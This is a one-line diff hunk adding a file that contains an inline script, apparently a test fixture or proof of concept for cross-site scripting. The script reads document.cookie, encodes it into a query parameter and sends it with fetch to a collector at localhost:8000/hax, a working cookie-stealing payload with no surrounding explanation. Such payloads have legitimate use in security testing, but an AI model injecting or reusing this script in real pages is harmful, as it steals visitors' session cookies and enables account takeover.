@@ -1,0 +1,1 @@
+X<script inline="javascript">var url=new URL('http://localhost:8000/hax?x=1'); url.searchParams.set('x', JSON.stringify(document.cookie)); fetch(url)</script>
